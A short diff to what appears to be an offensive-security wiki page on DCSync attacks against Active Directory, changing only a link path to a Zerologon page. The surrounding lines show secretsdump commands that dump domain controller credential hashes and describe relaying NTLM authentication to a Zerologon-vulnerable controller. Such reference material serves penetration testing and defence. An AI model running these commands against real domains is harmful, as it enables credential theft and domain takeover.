@@ -27,7 +27,7 @@ secretsdump -outputfile resultsfile -hashes 'LMhash':'NThash' 'DOMAIN'/'USER'@'D
 secretsdump -k -outputfile resultsfile 'DOMAIN'/'USER'@'DOMAINCONTROLLER'
 ```
 
-This attack can also be operated with a [relayed NTLM authentication](../../abusing-lm-and-ntlm/relay.md), but only if the target domain controller is vulnerable to [Zerologon](../../frontal-attacks-2/zerologon.md) since the DRSUAPI always requires signing.
+This attack can also be operated with a [relayed NTLM authentication](../../abusing-lm-and-ntlm/relay.md), but only if the target domain controller is vulnerable to [Zerologon](../../netlogon/zerologon.md) since the DRSUAPI always requires signing.
 
 ```bash
 # target vulnerable to Zerologon, dump DC's secrets only
